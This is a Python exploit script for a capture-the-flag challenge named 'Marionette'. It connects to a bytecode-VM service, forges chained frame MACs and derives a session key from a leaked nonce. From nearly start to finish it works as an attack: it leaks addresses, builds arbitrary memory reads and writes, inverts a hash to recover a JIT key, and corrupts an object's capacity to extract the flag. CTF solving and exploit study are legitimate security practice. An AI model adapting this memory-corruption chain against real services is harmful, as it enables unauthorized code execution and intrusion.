#!/usr/bin/env python3
"""Local/remote client for the Marionette exploit path supplied by the user."""
import argparse
import re
import socket
import struct
import sys

MASK64 = (1 << 64) - 1
FNV_OFFSET = 0xcbf29ce484223325
FNV_PRIME = 0x100000001B3
G0 = 0xe3a7d1b5924f6c80
G1 = 0x9fed4fa8a9104ce8
MIX_A = 0xff51afd7ed558ccd
MIX_B = 0xc4ceb9fe1a85ec53
MIX_C = 0x9fcefcacc5ea5bfb
REKEY_PC = 0xc2b2ae3d27d4eb4f
REKEY_TAG = 0x4d4152494f4e4554
DISPATCH_G = 0x3c6ef372fe94f82a
DISPATCH_C = 0x9e3779b97f4a7c15


def mix(x):
    x &= MASK64
    x ^= x >> 33
    x = x * MIX_A & MASK64
    x ^= x >> 33
    x = x * MIX_B & MASK64
    x ^= x >> 33
    return x & MASK64


def xs128(state):
    state &= MASK64
    state ^= state << 13 & MASK64
    state ^= state >> 7
    state ^= state << 17 & MASK64
    return state & MASK64


def noinit_mix(x):
    x = x * MIX_A & MASK64
    x ^= x >> 33
    x = x * MIX_B & MASK64
    x ^= x >> 33
    return x & MASK64


def stage_key(nonce):
    x = nonce ^ (nonce >> 33)
    h2, h3 = noinit_mix(x), noinit_mix(x ^ 0xBEEF)
    count = (h2 % 7) + 3 + (h3 & 3) + 2
    state = (G0 ^ G1) ^ nonce
    for _ in range(count):
        state = xs128(state)
    return mix(mix(state) ^ MIX_C)


def chain_mac(seq, prev_mac, payload):
    h = FNV_OFFSET if seq == 1 else prev_mac
    for b in struct.pack('<IQ', seq, prev_mac) + payload:
        h = ((h ^ b) * FNV_PRIME) & MASK64
    return h


def rekey_seed(seed, opcode, pc):
    return mix(seed ^ ((pc * REKEY_PC) & MASK64) ^ ((opcode & 0xffff) << 32) ^ REKEY_TAG)


class Puppet:
    def __init__(self, host, port, timeout=15):
        self.sock = socket.create_connection((host, port), timeout)
        self.sock.settimeout(timeout)
        self.seq = 1
        self.prev_mac = 0
        self.banner = self._read_until(b'READY\n')
        # The challenge emits a separate startup acknowledgement after READY.
        self._drain_startup()

    def _read_until(self, marker):
        data = bytearray()
        while marker not in data:
            part = self.sock.recv(4096)
            if not part:
                break
            data.extend(part)
        return bytes(data)

    def _drain_startup(self):
        old = self.sock.gettimeout()
        try:
            self.sock.settimeout(0.2)
            while self.sock.recv(65536):
                pass
        except socket.timeout:
            pass
        finally:
            self.sock.settimeout(old)

    def frame(self, typ, payload=b''):
        mac = chain_mac(self.seq, self.prev_mac, payload)
        self.sock.sendall(struct.pack('>BIQH', typ, self.seq, mac, len(payload)) + payload)
        self.prev_mac = mac
        self.seq += 1
        chunks = []
        old = self.sock.gettimeout()
        try:
            chunks.append(self.sock.recv(65536))
            self.sock.settimeout(0.08)
            while True:
                try:
                    part = self.sock.recv(65536)
                except socket.timeout:
                    break
                if not part:
                    break
                chunks.append(part)
        finally:
            self.sock.settimeout(old)
        return b''.join(chunks)

    def run(self, code):
        return self.frame(1, struct.pack('>H', len(code)) + code)


def push(q):
    return b'\x01' + struct.pack('<Q', q & MASK64)


def shuffle_write(index, value):
    return push(index) + push(value) + push(1) + b'\x60'


def shuffle_read_print():
    return push(0) + push(0) + push(0) + b'\x60\x50'


def printed_ints(data):
    return [int(x) & MASK64 for x in re.findall(rb'(-?\d+)\n', data)]


def run_stage(p):
    m = re.search(rb'SESSION NONCE ([0-9a-fA-F]{16})', p.banner)
    if not m:
        raise RuntimeError(f'no ASCII-hex nonce in startup banner: {p.banner!r}')
    nonce = int(m.group(1), 16)
    return p.frame(0x50, struct.pack('<Q', stage_key(nonce)))


def read_at(p, ctx, pivot, address):
    code = shuffle_write(-2, pivot) + shuffle_write(-2, address) + shuffle_read_print()
    vals = printed_ints(p.run(code))
    if not vals:
        raise RuntimeError(f'memory read failed at {address:#x}')
    return vals[-1]


def inv_xor_right(value, shift=33):
    out = value & MASK64
    amount = shift
    while amount < 64:
        out ^= value >> amount
        amount += shift
    return out & MASK64


def inv_mix(value):
    value = inv_xor_right(value)
    value = value * pow(MIX_B, -1, 1 << 64) & MASK64
    value = inv_xor_right(value)
    value = value * pow(MIX_A, -1, 1 << 64) & MASK64
    return inv_xor_right(value)


def exploit_prints(host, port):
    """Use the supplied exploit_prints chain; return only a target-emitted flag."""
    last_error = None
    for object_slot in (1, 2, 3):
        p = None
        try:
            p = Puppet(host, port)
            run_stage(p)
            v = printed_ints(p.run(push(0) + b'\x43\x50'))
            if not v:
                raise RuntimeError('could not leak slot 0')
            ctx = (v[-1] - 0xfa0) & MASK64
            pivot = (ctx + 0x928) & MASK64
            v = printed_ints(p.run(push(object_slot) + b'\x43\x50'))
            if not v:
                raise RuntimeError(f'could not leak slot {object_slot}')
            obj = v[-1]

            ba0 = read_at(p, ctx, pivot, ctx + 0xba0)
            ab0 = read_at(p, ctx, pivot, ctx + 0xab0)
            bb0 = read_at(p, ctx, pivot, ctx + 0xbb0)
            key = (ba0 ^ inv_mix(bb0) ^ ab0) & MASK64
            if mix(ba0 ^ (key ^ ab0)) != bb0:
                raise RuntimeError('JIT key validation failed')

            p.run(shuffle_write(-2, pivot) + shuffle_write(-2, obj + 8) + shuffle_read_print())
            write_code = (shuffle_write(-1, obj + 8) + shuffle_write(-3, ctx + 0x918)
                          + shuffle_write(0, (0x201 << 32) | 2) + shuffle_read_print())
            write_result = p.run(write_code)
            if (0x201 << 32 | 2) not in printed_ints(write_result):
                raise RuntimeError('puppet capacity write did not stick')

            result = p.run(push(obj) + push(obj) + push(key) + b'\x66\x51')
            m = re.search(rb'CSCV2026\{[^}\n]+\}', result)
            if m:
                return m.group(0), {'object_slot': object_slot, 'object': obj, 'ctx': ctx, 'key': key}
            raise RuntimeError(f'finale returned no flag: {result!r}')
        except Exception as exc:
            last_error = exc
        finally:
            if p:
                p.sock.close()
    raise RuntimeError(f'all puppet slots failed: {last_error}')


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('host')
    ap.add_argument('port', type=int)
    args = ap.parse_args()
    try:
        flag, info = exploit_prints(args.host, args.port)
        print(f'[LOCAL/REMOTE RESPONSE] {flag.decode()}')
        print(f'exploit info: {info}', file=sys.stderr)
    except Exception as exc:
        print(f'[-] Exploit failed: {exc}', file=sys.stderr)
        sys.exit(1)


if __name__ == '__main__':
    main()
